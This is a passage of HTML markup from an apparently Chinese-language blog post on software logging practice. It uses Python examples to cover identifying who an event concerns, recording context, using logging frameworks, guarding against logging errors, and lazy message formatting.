title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    # some code has check the username\r\n    if not valid_password(password) or not check_password(username, password):\r\n        logger.warn('user_login failed due to password')\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b80396436306-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b80396436306-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b80396436306-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b80396436306-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b80396436306-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b80396436306-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b80396436306-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b80396436306-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some code has check the username</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b80396436306-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b80396436306-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to password'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b80396436306-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b80396436306-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n\n</div>\n<p>上面的代码给出了出了什么问题，但是没有包含是谁出了问题，至少应该是</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b84498741084\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    # some code has check the username\r\n    if not valid_password(password) or not check_password(username, password):\r\n        logger.warn('user_login failed due to password, username %s', username)\r\n        return</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b84498741084-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b84498741084-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b84498741084-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b84498741084-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b84498741084-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b84498741084-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b84498741084-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some code has check the username</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b84498741084-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b84498741084-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to password, username %s'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b84498741084-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<p>日志的唯一标识也能帮助我们检索、过滤，找出该唯一标识的最近一段时间的所有日志，再按照时间排序，就能还原日志主体的活动轨迹，比如一个用户在网站上的操作会发散到多个进程、服务。当通过用户名（用户的唯一标识）搜索日志时，就能还原该玩家的操作记录，这个在查线上问题的时候非常有效。</p>\n<p>当然，这个唯一标识是很广泛的，需要根据具体情况决定，如果网络请求，可能更好的是requestid、sessionid；如果是系统日志，那么可能是进程、线程ID；如果是分布式集群，那么可能是副本的唯一id</p>\n<h2>context: environment when event happens</h2>\n<p>日志记录的事件发生的上下文环境直观重要，能告知事件是在什么样的情况发生的。当然，上面提到的when、where、who都属于上下文，这些都是固定的，通用的。而在本小节，context专指高度依赖于具体的日志内容的信息，这些信息，是用于定位问题的具体原因。比如</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b88819084985\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef user_login(username, password):\r\n    # some code has check the username\r\n    if not valid_password(password) or not check_password(username, password):\r\n        logger.warn('user_login failed due to password, username %s', username)\r\n        return\r\n    # some others code</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b88819084985-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b88819084985-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b88819084985-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b88819084985-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b88819084985-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b88819084985-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b88819084985-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">user_login</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b88819084985-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some code has check the username</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b88819084985-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">valid_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_password</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">password</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b88819084985-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">warn</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'user_login failed due to password, username %s'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">username</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b88819084985-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b88819084985-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># some others code</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<p>阅读代码，当password不符合规范，或者校验password失败的时候都会出错，但是到底是那种情况呢，日志内容并没有指出，所以这条日志仍然不合格。</p>\n<p>在我看来，这部分是弹性最大，但是又最重要的部分，造成异常的情况很多，记录哪些信息，完全取决于写代码的程序员。但事实上也很简单，遵循一个原则即可：<strong>想想加上哪些信息能定位问题发生的原因</strong>！</p>\n<h1>how to log and tips</h1>\n<h2>use logging framework</h2>\n<p>早期的编程语言提供的日志功能都比较初级，一般都是输出到终端或者文件，如C++、Java，而且不支持统一的输出格式的配置。对于这些语言，一般会有单独的log框架，如glog，log4cpp，log4j，elf4j等等。而更新的一些语言，一般都内置强大的logging模块，如python。</p>\n<p>在前面在讲述“what to log”的时候，我们指出要记录日志发生的时间、地点、等级等信息。那么这些信息是不是每次都在日志内容里面打印呢，这些内容确实是一条完整的日志所必须的，但是如果要程序员写每条日志的时候都得手动加上这些内容，那么无疑是一种负担。框架、模块的作用就是将程序员从这些繁文缛节中解放出来。比如在很多logging框架模块（thon logging、log4j）中，都有named logger这一概念，这个name就可以是module， filename， classname或者instance，这就解决了上一章节提到了“where the event happen”这个问题。</p>\n<p>在这里，对logging框架的介绍就不详细展开，只是总结一下logging框架、模块的功能</p>\n<p>（1）设置log的输出等级</p>\n<p>这样可以不改程序代码，仅仅修改log的输出等级，就能够控制哪些日志输出，哪些日志不输出。比如我们在开发期的调试日志，都可以设置为DEBUG，上线的时候设置输出等级为INFO，那么这些调试日志就不会被输出。</p>\n<p>（2）设置每条日志默认包含的内容</p>\n<p>以<a href=\"https://docs.python.org/2/library/logging.html#logrecord-attributes\" target=\"_blank\">Python logging</a>为例，可以通过formatter设置每条日志默认包含哪些信息，比如时间、文件、行号、进程、线程信息。</p>\n<p>（3）设置日志的输出目标</p>\n<p>通过配置，可以指定日志是输出到stdout，还是文件，还是网络。特别是在linux服务器上，将日志输出到syslog，再使用syslog强大的处理、分发功能，配合elk系统进行分析，是很多应用程序的通用做法。</p>\n<h2>log never throw</h2>\n<p>我们打印日志，是为了记录事故发生的现场，以便发现问题，解决问题。那么就得保证，打印日志这一行为本身不能引入新的问题，比如，不能出错抛异常。这就好比，处理车祸的消防车不能冲进现场一样。</p>\n<p>但是，越重要的日志，比如Error、 Fatal级别的日志，出现的概率应该是越低的，我们也不希望产生这样的日志，因为一旦出现就意味着异常或者线上事故。这样的日志，就一定要做好单元测试、覆盖率测试，保证日志本身是能够正常工作的。</p>\n<h2>log when u think something never happen</h2>\n<p>这一点，应该是针对why or when to log而言。就是说，当你认为某种情况一定不会发生，按照墨菲定律，它还是很可能会发生，那么就应该在万一发生的情况记录log，Error（Fatal）级别的log。尤其是在异步，并发的情况下，程序员任务的不可能都会成为可能。</p>\n<p>比如下面的伪代码</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b8e775047851\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef magic_func():\r\n    if check_ok():\r\n        do_something()\r\n\r\n    return</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b8e775047851-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b8e775047851-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b8e775047851-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b8e775047851-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b8e775047851-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b8e775047851-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">magic_func</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b8e775047851-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">check_ok</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b8e775047851-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">do_something</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b8e775047851-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b8e775047851-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n\n</div>\n<p>代码很简单，如果条件满足，那么就做相应处理，否则直接返回。这里有两种可能，第一种是条件不满足是可能的、可预期的情况，只是说，在这种情况下什么都不用作；第二种情况是程序员觉得条件一定会满足，一定不会出现else的情况，所以什么都没做。如果是第二种情况，那么就一定得加日志，因为一切都可能发生。</p>\n<h2>lazy logging</h2>\n<p>日志的内容，在最终输出的时候，应该是一个字符串，那么这个字符串是什么时候产生呢？前面提到，我们可以通过log level来控制一条日志是否被输出，那么字符串的生成越迟越好，因为有可能日志根本就无需输出，也就无需生成这个字符串，这也是我之前提到过的<a href=\"https://www.cnblogs.com/xybaby/p/6425735.html\" target=\"_blank\">lazy思想</a>。</p>\n<p>至于lazy logging，各个语言、框架都是大同小异的，在<a href=\"https://garygregory.wordpress.com/2015/10/08/the-art-of-logging-advanced-message-formatting/\" target=\"_blank\">这篇文章</a>中，举出了log4j的例子，在这里还是用我比较熟悉的python讲解这个例子</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b92196962119\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#coding=utf-8\r\nimport logging\r\n\r\nlogger = logging.getLogger('LazyLogging')\r\nlogger.setLevel(logging.DEBUG)\r\nhander = logging.StreamHandler()\r\nformatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s') \r\nhander.setFormatter(formatter)  \r\nlogger.addHandler(hander)\r\n\r\ndef getUserCount():\r\n    logger.info('getUserCount is called')\r\n    return 1\r\n\r\nlogger.debug(\"There are \" + str(getUserCount()) + \" users logged in now.\")</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b92196962119-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b92196962119-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b92196962119-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b92196962119-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b92196962119-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b92196962119-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b92196962119-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b92196962119-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-1\"><span class=\"crayon-p\">#coding=utf-8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b92196962119-2\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">logging</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b92196962119-4\"><span class=\"crayon-v\">logger</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getLogger</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'LazyLogging'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-5\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setLevel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">DEBUG</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b92196962119-6\"><span class=\"crayon-v\">hander</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">StreamHandler</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-7\"><span class=\"crayon-v\">formatter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">logging</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Formatter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b92196962119-8\"><span class=\"crayon-v\">hander</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFormatter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">formatter</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-9\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span 